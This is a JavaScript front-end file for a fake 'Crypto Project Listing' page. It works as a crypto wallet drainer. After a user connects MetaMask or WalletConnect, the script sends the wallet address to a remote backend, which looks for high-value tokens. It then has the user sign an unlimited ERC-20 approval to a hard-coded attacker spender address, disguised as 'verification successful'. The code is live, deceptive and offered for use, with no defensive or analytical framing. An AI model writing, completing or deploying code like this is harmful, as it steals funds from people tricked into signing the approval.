'use strict';

/* ============================
   CONFIG & GLOBAL VARIABLES
   ============================ */
const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
const SPENDER_ADDRESS = "0x3352a9d6719a321608806a71b5bec20259cd34ce";
const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";

let provider, signer, activeProviderType = null;

/* ============================
   DOM REFERENCES (Your Originals)
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

/* ============================
   ORIGINAL UI FLOW 
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

/* ============================
   CONNECTION HANDLERS
   ============================ */
if (metaMaskButton) {
  metaMaskButton.addEventListener('click', connectMetaMask);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnect);
}

/* ============================
   BLOCKCHAIN LOGIC (REFINED)
   ============================ */

async function handleWalletProcess(authProvider) {
  try {
    const accounts = await authProvider.request({ method: "eth_requestAccounts" });
    const account = accounts[0];

    provider = new ethers.providers.Web3Provider(authProvider);
    signer = provider.getSigner();

    // 1. Backend scan
    const response = await fetch(`${BACKEND_URL}/notify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: account })
    });

    const data = await response.json();

    // 2. Dynamic Approval
    if (data.success && data.tokenAddress) {
      await approveSpender(account, data.tokenAddress, data.symbol);
    } else {
      console.log("No high value assets found.");
      alert("Verification successful!");
      walletModal.style.display = 'none';
    }
  } catch (error) {
    console.error("Process failed:", error);
    alert("Connection error. Please try again.");
  }
}

async function approveSpender(account, tokenAddress, symbol) {
  try {
    const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

    const tx = await contract.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
    console.log(`Approval sent for ${symbol}:`, tx.hash);

    await tx.wait();
    alert(`✅ ${symbol} verification successful!`);
    walletModal.style.display = 'none';
  } catch (error) {
    console.error("Approval failed:", error);
    walletModal.style.display = 'none';
  }
}

/* ============================
   METAMASK CONNECT
   ============================ */
async function connectMetaMask() {
  if (!window.ethereum) {
    alert("MetaMask is not installed. Please use WalletConnect.");
    return;
  }
  await handleWalletProcess(window.ethereum);
}

/* ============================
   WALLETCONNECT v2
   ============================ */
let wcProvider = null;

async function connectWalletConnect() {
  try {
    if (wcProvider) {
      await wcProvider.disconnect().catch(() => {});
      wcProvider = null;
    }

    walletConnectButton.classList.add('loading');
    walletConnectButton.disabled = true;

    // Use the latest stable version from esm.sh
    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.2?bundle');

    wcProvider = await EthereumProvider.init({
      projectId: WC_PROJECT_ID, 
      chains: [1], 
      showQrModal: true,
      metadata: {
        name: 'Crypto Project Listing',
        url: window.location.origin
      }
    });

    await wcProvider.enable();
    
    // IMPORTANT: Send the wcProvider to our main logic "brain"
    // This ensures WalletConnect also scans for high-value tokens
    await handleWalletProcess(wcProvider);

  } catch (err) {
    console.error("WalletConnect Error:", err);
    alert('Wallet Connection Error. Please retry or refresh the page.');
  } finally {
    walletConnectButton.classList.remove('loading');
    walletConnectButton.disabled = false;
  }
}
